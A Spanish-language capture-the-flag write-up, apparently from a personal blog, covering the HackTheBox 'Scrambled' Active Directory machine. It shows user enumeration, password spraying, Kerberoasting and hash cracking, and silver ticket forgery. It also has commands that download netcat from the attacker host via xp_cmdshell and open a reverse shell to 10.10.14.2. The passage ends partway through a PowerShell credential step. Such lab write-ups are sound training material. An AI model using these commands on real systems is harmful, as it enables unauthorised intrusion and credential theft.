---
layout: post
title: "HackTheBox - Scrambled (medium)"
categories: hackthebox/machines/medium
---

<p align="center">
<img src="https://labs.hackthebox.com/storage/avatars/6a88f8059e46c1d5652c3c15ac2cb9f3.png">
</p>

- Scrambled is a medium Windows Active Directory machine. Enumerating the website hosted on the remote machine a potential attacker is able to deduce the credentials for the user `ksimpson`. On the website, it is also stated that NTLM authentication is disabled meaning that Kerberos authentication is to be used. Accessing the `Public` share with the credentials of `ksimpson`, a PDF file states that an attacker retrieved the credentials of an SQL database. This is a hint that there is an SQL service running on the remote machine. Enumerating the normal user accounts, it is found that the account `SqlSvc` has a `Service Principal Name` (SPN) associated with it. An attacker can use this information to perform an attack that is knows as `kerberoasting` and get the hash of `SqlSvc`. After cracking the hash and acquiring the credentials for the `SqlSvc` account an attacker can perform a `silver ticket` attack to forge a ticket and impersonate the user `Administrator` on the remote MSSQL service. Enumeration of the database reveals the credentials for user `MiscSvc`, which can be used to execute code on the remote machine using PowerShell remoting. System enumeration as the new user reveals a `.NET` application, which is listening on port `4411`. Reverse engineering the application reveals that it is using the insecure `Binary Formatter` class to transmit data, allowing the attacker to upload their own payload and get code execution as `nt authority\system`.

## PortScan

- Comenzamos escaneando los puertos abiertos por el protocolo `TCP` así como sus servicios que corren en los puertos.

```bash
➜  nmap sudo nmap -sCV -p53,80,88,135,139,389,445,464,593,636,1433,3268,3269,4411,5985,9389,49667,49673,49674,49686,49727 10.10.11.168 -oN targeted
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-29 18:25 CST
Nmap scan report for 10.10.11.168
Host is up (0.082s latency).

Bug in ms-sql-ntlm-info: no string output.
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Scramble Corp Intranet
| http-methods:
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-04-30 00:25:54Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC1.scrm.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC1.scrm.local
| Not valid before: 2024-04-30T00:11:57
|_Not valid after:  2025-04-30T00:11:57
|_ssl-date: 2024-04-30T00:29:01+00:00; -4s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)
|_ssl-date: 2024-04-30T00:29:01+00:00; -4s from scanner time.
| ssl-cert: Subject: commonName=DC1.scrm.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC1.scrm.local
| Not valid before: 2024-04-30T00:11:57
|_Not valid after:  2025-04-30T00:11:57
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-info:
|   10.10.11.168:1433:
|     Version:
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
|_ssl-date: 2024-04-30T00:29:01+00:00; -4s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2024-04-30T00:21:53
|_Not valid after:  2054-04-30T00:21:53
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)
|_ssl-date: 2024-04-30T00:29:01+00:00; -4s from scanner time.
| ssl-cert: Subject: commonName=DC1.scrm.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC1.scrm.local
| Not valid before: 2024-04-30T00:11:57
|_Not valid after:  2025-04-30T00:11:57
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC1.scrm.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC1.scrm.local
| Not valid before: 2024-04-30T00:11:57
|_Not valid after:  2025-04-30T00:11:57
|_ssl-date: 2024-04-30T00:29:01+00:00; -4s from scanner time.
4411/tcp  open  found?
| fingerprint-strings:
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, NCP, NULL, NotesRPC, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns:
|     SCRAMBLECORP_ORDERS_V1.0.3;
|   FourOhFourRequest, GetRequest, HTTPOptions, Help, LPDString, RTSPRequest, SIPOptions:
|     SCRAMBLECORP_ORDERS_V1.0.3;
|_    ERROR_UNKNOWN_COMMAND;
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49686/tcp open  msrpc         Microsoft Windows RPC
49727/tcp open  msrpc         Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port4411-TCP:V=7.94SVN%I=7%D=4/29%Time=66303A95%P=x86_64-pc-linux-gnu%r
SF:(NULL,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(GenericLines,1D,"SCRAMB
SF:LECORP_ORDERS_V1\.0\.3;\r\n")%r(GetRequest,35,"SCRAMBLECORP_ORDERS_V1\.
SF:0\.3;\r\nERROR_UNKNOWN_COMMAND;\r\n")%r(HTTPOptions,35,"SCRAMBLECORP_OR
SF:DERS_V1\.0\.3;\r\nERROR_UNKNOWN_COMMAND;\r\n")%r(RTSPRequest,35,"SCRAMB
SF:LECORP_ORDERS_V1\.0\.3;\r\nERROR_UNKNOWN_COMMAND;\r\n")%r(RPCCheck,1D,"
SF:SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(DNSVersionBindReqTCP,1D,"SCRAMBLE
SF:CORP_ORDERS_V1\.0\.3;\r\n")%r(DNSStatusRequestTCP,1D,"SCRAMBLECORP_ORDE
SF:RS_V1\.0\.3;\r\n")%r(Help,35,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\nERROR_UN
SF:KNOWN_COMMAND;\r\n")%r(SSLSessionReq,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\
SF:r\n")%r(TerminalServerCookie,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(
SF:TLSSessionReq,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(Kerberos,1D,"SC
SF:RAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(SMBProgNeg,1D,"SCRAMBLECORP_ORDERS_
SF:V1\.0\.3;\r\n")%r(X11Probe,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(Fo
SF:urOhFourRequest,35,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\nERROR_UNKNOWN_COMM
SF:AND;\r\n")%r(LPDString,35,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\nERROR_UNKNO
SF:WN_COMMAND;\r\n")%r(LDAPSearchReq,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n
SF:")%r(LDAPBindReq,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(SIPOptions,3
SF:5,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\nERROR_UNKNOWN_COMMAND;\r\n")%r(LAND
SF:esk-RC,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(TerminalServer,1D,"SCR
SF:AMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(NCP,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3
SF:;\r\n")%r(NotesRPC,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(JavaRMI,1D
SF:,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(WMSRequest,1D,"SCRAMBLECORP_ORD
SF:ERS_V1\.0\.3;\r\n")%r(oracle-tns,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n"
SF:)%r(ms-sql-s,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(afp,1D,"SCRAMBLE
SF:CORP_ORDERS_V1\.0\.3;\r\n")%r(giop,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\
SF:n");
Service Info: Host: DC1; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2024-04-30T00:28:22
|_  start_date: N/A
|_clock-skew: mean: -4s, deviation: 0s, median: -4s
```

## Enumeración

- De primeras no vemos nada de información relevante sobre la maquina.

```bash
➜  nmap cme smb 10.10.11.168
SMB         10.10.11.168    445    10.10.11.168     [*]  x64 (name:10.10.11.168) (domain:10.10.11.168) (signing:True) (SMBv1:False)
```

- Como la maquina tiene muchos puertos abiertos podemos probar con otro protocolo.

```bash
➜  nmap cme ldap 10.10.11.168
LDAP        10.10.11.168    389    DC1.scrm.local   [*]  x64 (name:DC1.scrm.local) (domain:scrm.local) (signing:True) (SMBv1:False)
```

- Ahora vamos agregar los dominios al `/etc/hosts`.

```bash
➜  nmap echo "10.10.11.168 scrm.local DC1.scrm.local dc1.scrm.local" | sudo tee -a /etc/hosts
10.10.11.168 scrm.local DC1.scrm.local dc1.scrm.local
```

- Al parecer tenemos limitaciones para enumerar por el protocolo `smb`.

```bash
➜  nmap crackmapexec smb 10.10.11.168 --shares
SMB         10.10.11.168    445    10.10.11.168     [*]  x64 (name:10.10.11.168) (domain:10.10.11.168) (signing:True) (SMBv1:False)
SMB         10.10.11.168    445    10.10.11.168     [-] Error enumerating shares: STATUS_USER_SESSION_DELETED
➜  nmap smbmap -H 10.10.11.168 --no-banner
[*] Detected 1 hosts serving SMB
[*] Established 0 SMB session(s)
```

- Tampoco podemos enumerar por el protocolo **RPC**.

```bash
➜  nmap rpcclient -N -U '' 10.10.11.168
Cannot connect to server.  Error was NT_STATUS_NOT_SUPPORTED
```

- Tenemos el puerto **80** abierto a si que podemos ver su contenido y si encontramos algo interesante.

```ruby
➜  nmap whatweb http://10.10.11.168
http://10.10.11.168 [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Microsoft-IIS/10.0], IP[10.10.11.168], JQuery, Microsoft-IIS[10.0], Script, Title[Scramble Corp Intranet]
```

- Esta es la pagina web.

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/scrambled/1.png">
</p>

- En la parte de `IT Services` encontramos lo siguiente.

- Nos dicen que debido a la brecha de seguridad que hubo el mes pasado deshabilitaron la autenticación NTLM pero dice que seamos pacientes mientras trabajan en resolverlo.

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/scrambled/2.png">
</p>

- Tenemos `Resources` interesantes.

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/scrambled/3.png">
</p>

- Probando en `New User Account` no funciona.

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/scrambled/4.png">
</p>

- Pero en **Contacting IT Support** vemos un nombre de usuario que es `ksimpson`.

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/scrambled/5.png">
</p>

- Podemos usa `kerbrute` para verificar que sea un usuario del dominio pero como no sabemos si existan mas usuarios podemos usar un diccionario <https://github.com/attackdebris/kerberos_enum_userlists/blob/master/A-ZSurnames.txt> para enumerar mas usuarios en caso de que los allá.

```bash
➜  nmap /opt/kerbrute_linux_amd64 userenum -d scrm.local --dc DC1.scrm.local /opt/A-ZSurnames.txt

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: v1.0.3 (9dad6e1) - 04/29/24 - Ronnie Flathers @ropnop

2024/04/29 18:53:06 >  Using KDC(s):
2024/04/29 18:53:06 >  	DC1.scrm.local:88

2024/04/29 18:53:06 >  [+] VALID USERNAME:	 ASMITH@scrm.local
2024/04/29 18:53:44 >  [+] VALID USERNAME:	 JHALL@scrm.local
2024/04/29 18:53:48 >  [+] VALID USERNAME:	 KSIMPSON@scrm.local
2024/04/29 18:53:51 >  [+] VALID USERNAME:	 KHICKS@scrm.local
2024/04/29 18:54:22 >  [+] VALID USERNAME:	 SJENKINS@scrm.local
```

- Vamos agregarlos a una lista.

```bash
➜  content cat users.txt
asmith
jhall
ksimpson
khicks
sjenkins
```

- Si recordamos no tenemos la autenticación `NTLM` activada pero podemos probar solicitar un `TGT`.

```bash
➜  content impacket-GetNPUsers scrm.local/ -no-pass -usersfile users.txt
Impacket v0.11.0 - Copyright 2023 Fortra

[-] User asmith doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User jhall doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User ksimpson doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User khicks doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User sjenkins doesn't have UF_DONT_REQUIRE_PREAUTH set
```

- Lo que podemos hacer es ver si algún usuario usa su nombre de usuario como su contraseña esto casi siempre suele pasar podemos usar `crackmapexec` y `kerbrute` para este proceso.

- Lo hacemos con otro protocolo por que `smb` no funciona y de los que tiene contemplado `crackmapexec` `ldap` si funciona.

```bash
➜  content cme ldap scrm.local -u users.txt -p users.txt -k --no-bruteforce --continue-on-success
LDAP        scrm.local      389    DC1.scrm.local   [*]  x64 (name:DC1.scrm.local) (domain:scrm.local) (signing:True) (SMBv1:False)
LDAP        scrm.local      389    DC1.scrm.local   [-] scrm.local\asmith:asmith KDC_ERR_PREAUTH_FAILED
LDAP        scrm.local      389    DC1.scrm.local   [-] scrm.local\jhall:jhall KDC_ERR_PREAUTH_FAILED
LDAPS       scrm.local      636    DC1.scrm.local   [+] scrm.local\ksimpson
LDAPS       scrm.local      636    DC1.scrm.local   [-] scrm.local\khicks:khicks KDC_ERR_PREAUTH_FAILED
LDAPS       scrm.local      636    DC1.scrm.local   [-] scrm.local\sjenkins:sjenkins KDC_ERR_PREAUTH_FAILED
```

- El usuario `ksimson` usa como contraseña su nombre de usuario también podemos validarlo con `kerbrute`.

```bash
➜  content /opt/kerbrute_linux_amd64 bruteuser --dc 10.10.11.168 -d scrm.local users.txt ksimpson

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: v1.0.3 (9dad6e1) - 04/29/24 - Ronnie Flathers @ropnop

2024/04/29 19:04:36 >  Using KDC(s):
2024/04/29 19:04:36 >  	10.10.11.168:88

2024/04/29 19:04:36 >  [+] VALID LOGIN:	 ksimpson@scrm.local:ksimpson
2024/04/29 19:04:36 >  Done! Tested 5 logins (1 successes) in 0.400 seconds
```

## Shell as SQLSvc

- Como tenemos credenciales podemos probar un `Kerberoasting Attack` pero con el parámetro `-k` ya que tenemos la atención `NTLM` deshabilitada.

```bash
➜  content impacket-GetUserSPNs scrm.local/ksimpson:ksimpson -k
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Getting machine hostname
[-] The SMB request is not supported. Probably NTLM is disabled. Try to specify corresponding NetBIOS name or FQDN as the value of the -dc-host option
```

- Aun así obtenemos un error.

```bash
➜  content impacket-GetUserSPNs scrm.local/ksimpson:ksimpson -k -dc-ip dc1.scrm.local
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Getting machine hostname
[-] The SMB request is not supported. Probably NTLM is disabled. Try to specify corresponding NetBIOS name or FQDN as the value of the -dc-host option
```

- Si buscamos en internet errores al operar con `-k` encontramos lo siguiente <https://github.com/fortra/impacket/issues/1206>.

- Pero tenemos que cambiar una parte del código en esta parte.

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/scrambled/6.png">
</p>

- Tenemos que cambiarla por esta.

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/scrambled/7.png">
</p>

- Ahora ya funciona.

```bash
➜  content impacket-GetUserSPNs scrm.local/ksimpson:ksimpson -k -dc-ip dc1.scrm.local
Impacket v0.11.0 - Copyright 2023 Fortra

[-] CCache file is not found. Skipping...
[-] CCache file is not found. Skipping...
ServicePrincipalName          Name    MemberOf  PasswordLastSet             LastLogon                   Delegation
----------------------------  ------  --------  --------------------------  --------------------------  ----------
MSSQLSvc/dc1.scrm.local:1433  sqlsvc            2021-11-03 10:32:02.351452  2024-04-29 18:21:51.223991
MSSQLSvc/dc1.scrm.local       sqlsvc            2021-11-03 10:32:02.351452  2024-04-29 18:21:51.223991
```

- Ahora vamos a obtener el hash del usuario `sqlsvc`.

```bash
➜  content impacket-GetUserSPNs scrm.local/ksimpson:ksimpson -k -dc-ip dc1.scrm.local -request
Impacket v0.11.0 - Copyright 2023 Fortra

[-] CCache file is not found. Skipping...
[-] CCache file is not found. Skipping...
ServicePrincipalName          Name    MemberOf  PasswordLastSet             LastLogon                   Delegation
----------------------------  ------  --------  --------------------------  --------------------------  ----------
MSSQLSvc/dc1.scrm.local:1433  sqlsvc            2021-11-03 10:32:02.351452  2024-04-29 18:21:51.223991
MSSQLSvc/dc1.scrm.local       sqlsvc            2021-11-03 10:32:02.351452  2024-04-29 18:21:51.223991



[-] CCache file is not found. Skipping...
$krb5tgs$23$*sqlsvc$SCRM.LOCAL$scrm.local/sqlsvc*$0404e156f2b44fdc2ccabae35e43d08d$eb31843c7e1cb948d143812b4a93c13e6241e8865b6a807e64c59acd7fdd841f438222bcfb364667dc59bfccc085c29405ca00b652b0b9a90d6c5647a9a3b2d9fdd119d4c85a2fcf490a0340b1649bdb55302cfecdf2bfbd18c6eee115c9e81c27869b976fc589b027e3128dece13b86bc4b8b7b659c733caa0f5a212e4917ff3b6584d52b8597599e9096da96cb2e4904bc848ff4972fee71188c948875c93c6d9aa493c8b02a115db904970717d2704368c1e6a364e6f1c7ba5d5524e9d7d8a11217c707c7a0c040d2b7aca2cc11113aafdcc22d0c3a01ec6f00d3424a959cdaf1adcb2295cf30aeac9cd3e8e96bb85497262171d4718ab7cf20f7b57d64de5e9f645871fbef03f763cb2256c8765d6eae6db3d8cee1109dfb530a782e472bd6b84b7622e91956544f521f76c66399d58b1e892a945316b7f88007c58f49e91f1dd7a7e96a1ed0d1652d16d896150f1e1799f5b733fcec1c3d3c7619892cf6ba0da6cb5239af4be492e3d082fa899eb4abe657a24bf908ff366e8a3c06a2b2462f35f793e690d92091ef264b7a7f440bd2660f42fabf1cef538d7e276825fabdf740859a3621efb81f25ca525ae8763e20d9907b1c37b37cc44bb186a5c39adc5f7d6bbb1f0255bfc9f716f34e2e6079549be7ff3a104ce3c2ecaddabaf0122b7394660c98ec32579f696a1ae20223ae2fd5a5ccebc258413fd6785374bbd6b4b2f40872aaa1e03cd621fdd7bc0860ac1498c26c8c7e82f6c16faeb70908c23bbc1b5ae03c62b55445e781c960ccc5b412320cd8cd0bc3d779a346a9c3940b5f1c3bc7ab8c31efc1d73ac4575c06a0337a03da926bc3a4d86accabd34c95a64569e0b6d089f15db63901de7dd308b9d1e76f7989b48f9f97c600dcaf6dfc3d0372c64b354bb5869f20e034ae1e5ab1a77e9e536351496290eac31e127fe015045c9e1e9a7d82d021b42eaa1773bf3bf87e9b0e52f4758013f7ef4c6cea2998f93c903f2120e09698910fa170dbcfac23920a7551a77285642046fabadb0bf1e822c169846e6d583053c8f9cee5e3775a784e6bd3e55323befa1bf9859a1036e659bb932f75296d14f33e047ced0731d7daf25c20f94c94604e709b5b9307c36f38e81211f7248eb6a05f19dbb78c754e7aa128984aa3eaba2a2c16d2c3fae396c8459c152150e467d06782669c70ada40d5b67361a198d1c945be215402b81b6f43dbfa9b3a12d20b804f9b51bb61568e14793687d8b33d51ed9da783403ebe4b20930b05ee92e44f1046158a01f2c871cf8a118a89b01d168e1fcd936f19101c115d69b1d5ca6ed2cc9acc95c23690287f4e9852b7f5d6af97c92cd5ee2ff82b4e8f32724809394976a75ea91c15c48da114419cca7499b3aeda0a71ff6067e78893d8e8f37941226928c00fa1684cf41fb7bbd30af815213f5
```

- Vamos a crackearlo con `john`.

```bash
➜  content john -w:/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Pegasus60        (?)
1g 0:00:00:13 DONE (2024-04-29 19:56) 0.07547g/s 809771p/s 809771c/s 809771C/s Peguero..Pearce
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

- Vamos a usar `mssqlclient.py` para conectarnos.

- Pero obtenemos un error.

```bash
➜  content impacket-mssqlclient scrm.local/sqlsvc:Pegasus60@10.10.11.168
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Encryption required, switching to TLS
[-] ERROR(DC1): Line 1: Login failed for user 'sqlsvc'.
```

- Tenemos que usar `kerberos` pero necesitamos un `TGT` para poder autenticarnos.

```bash
➜  content impacket-getTGT scrm.local/sqlsvc:Pegasus60
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Saving ticket in sqlsvc.ccache
```

- Ahora vamos a exportar la variable de entorno.

```bash
➜  content export KRB5CCNAME=sqlsvc.ccache
```

- Pero aun así no podemos.

```bash
➜  content impacket-mssqlclient dc1.scrm.local -k
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Encryption required, switching to TLS
[-] ERROR(DC1): Line 1: Login failed for user 'SCRM\sqlsvc'.
```

- Vamos a probar con el otro usuario.

- Pero nada.

```bash
➜  content impacket-getTGT scrm.local/ksimpson:ksimpson
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Saving ticket in ksimpson.ccache
➜  content export KRB5CCNAME=ksimpson.ccache
➜  content impacket-mssqlclient dc1.scrm.local -k
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Encryption required, switching to TLS
[-] ERROR(DC1): Line 1: Login failed for user 'SCRM\ksimpson'.
```

- Como tenemos el `SPN` podemos hacer un `Silver Ticket Attack` para suplantar un usuario.

- Pero antes podemos probar enumerar por `smb`.

```bash
➜  content impacket-smbclient scrm.local/ksimpson:ksimpson@dc1.scrm.local -k
Impacket v0.11.0 - Copyright 2023 Fortra

Type help for list of commands
# shares
ADMIN$
C$
HR
IPC$
IT
NETLOGON
Public
Sales
SYSVOL
# use Public
# ls
drw-rw-rw-          0  Thu Nov  4 16:23:19 2021 .
drw-rw-rw-          0  Thu Nov  4 16:23:19 2021 ..
-rw-rw-rw-     630106  Fri Nov  5 11:45:07 2021 Network Security Changes.pdf
# get Network Security Changes.pdf
```

- Al abrirlo ya vimos por que no podemos conectarnos al parecer solo los administradores pueden.

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/scrambled/8.png">
</p>

- Bueno vamos a suplantar la identidad del usuario administrador para hacer esto necesitamos el `Domain SID` del dominio para generar un `TGS` bajo el usuario administrador <https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/silver-ticket>.

```bash
➜  content impacket-getPac scrm.local/ksimpson:ksimpson -targetUser Administrator | grep Domain
LogonDomainName:                 'SCRM'
LogonDomainId:
ResourceGroupDomainSid:
Domain SID: S-1-5-21-2743207045-1827831105-2542523200
```

- Ahora necesitamos el hash `NT` para eso como tenemos la contraseña tenemos que convertirlo <https://codebeautify.org/ntlm-hash-generator>.

```bash
b999a16500b87d17ec7f2e2a68778f05
```

- Ahora vamos a usar `ticketer` con el `SPN` que tenemos, el `hash` y el `Domain SID.`

```bash
➜  content impacket-ticketer -spn MSSQLSvc/dc1.scrm.local -nthash b999a16500b87d17ec7f2e2a68778f05 -domain-sid S-1-5-21-2743207045-1827831105-2542523200 -dc-ip dc1.scrm.local -domain scrm.local Administrator
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for scrm.local/Administrator
[*] 	PAC_LOGON_INFO
[*] 	PAC_CLIENT_INFO_TYPE
[*] 	EncTicketPart
[*] 	EncTGSRepPart
[*] Signing/Encrypting final ticket
[*] 	PAC_SERVER_CHECKSUM
[*] 	PAC_PRIVSVR_CHECKSUM
[*] 	EncTicketPart
[*] 	EncTGSRepPart
[*] Saving ticket in Administrator.ccache
```

- Ahora exportamos la variable.

```bash
➜  content export KRB5CCNAME=Administrator.ccache
```

- Y listo.

```bash
➜  content impacket-mssqlclient dc1.scrm.local -k
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC1): Line 1: Changed database context to 'master'.
[*] INFO(DC1): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208)
[!] Press help for extra shell commands
SQL (SCRM\administrator  dbo@master)>
```

- Y bueno somos `administrator` a si que vamos habilitador `xp_cmdshell` para ejecutar comandos y asi poder ganar acceso.

```bash
SQL (SCRM\administrator  dbo@master)> enable_xp_cmdshell
[*] INFO(DC1): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
[*] INFO(DC1): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL (SCRM\administrator  dbo@master)> xp_cmdshell whoami
output
-----------
scrm\sqlsvc

NULL

SQL (SCRM\administrator  dbo@master)>
```

- Vamos a subir el nc.exe a la maquina.

```bash
➜  content cp /usr/share/seclists/Web-Shells/FuzzDB/nc.exe .
➜  content python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

```bash
SQL (SCRM\administrator  dbo@master)> xp_cmdshell "curl 10.10.14.2/nc.exe -o C:\Temp\netcat.exe"
output                                                                  
--------------------------------------------------------------------------------
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current

                                 Dload  Upload   Total   Spent    Left  Speed

  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--100 28160  100 28160    0     0  85836      0 --:--:-- --:--:-- --:--:-- 86116

NULL                                                                    
```

- Ahora nos ponemos en escucha.

```bash
➜  content rlwrap nc -nlvp 443
listening on [any] 443 ...
```

- Ahora nos enviamos la `reverse shell`.

```bash
SQL (SCRM\administrator  dbo@master)> xp_cmdshell "C:\Temp\netcat.exe -e cmd 10.10.14.2 443"
```

- La recibimos.

```bash
➜  content rlwrap nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.2] from (UNKNOWN) [10.10.11.168] 55826
Microsoft Windows [Version 10.0.17763.2989]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
scrm\sqlsvc

C:\Windows\system32>
```

## Shell as miscsvc

- Vemos otro usuario.

```bash
C:\Users>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 5805-B4B6

 Directory of C:\Users

05/11/2021  15:56    <DIR>          .
05/11/2021  15:56    <DIR>          ..
05/11/2021  22:28    <DIR>          administrator
03/11/2021  20:31    <DIR>          miscsvc
26/01/2020  18:54    <DIR>          Public
01/06/2022  14:58    <DIR>          sqlsvc
               0 File(s)              0 bytes
               6 Dir(s)  16,013,860,864 bytes free
```

- Vemos una vía no intencionada `SeImpersonatePrivilege`.

```bash
C:\Users>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeMachineAccountPrivilege     Add workstations to domain                Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

- Vamos hacerlo por la vía intencionada si no ya seria explotar eso y listo.

- Vamos a enumerar el servicio `sql`.

```bash
SQL (SCRM\administrator  dbo@master)> SELECT name FROM master.sys.databases;
name
----------
master

tempdb

model

msdb

ScrambleHR

SQL (SCRM\administrator  dbo@master)>
```

- Vamos a ver las tablas de `ScrambleHR`.

```bash
SQL (SCRM\administrator  dbo@master)> select table_name from ScrambleHR.information_schema.tables;
table_name
----------
Employees

UserImport

Timesheets

SQL (SCRM\administrator  dbo@master)>
```

- Vemos credenciales.

```bash
SQL (SCRM\administrator  dbo@master)> select * from ScrambleHR.dbo.UserImport
LdapUser   LdapPwd             LdapDomain   RefreshInterval   IncludeGroups
--------   -----------------   ----------   ---------------   -------------
MiscSvc    ScrambledEggs9900   scrm.local                90               0
```

- Podemos usar Powershell para definir la credencial.

```bash
PS C:\Windows\system32> $Cred = New-Object System.Management.Automation.PSCredential('scrm.local\MiscSvc', $SecPassword)
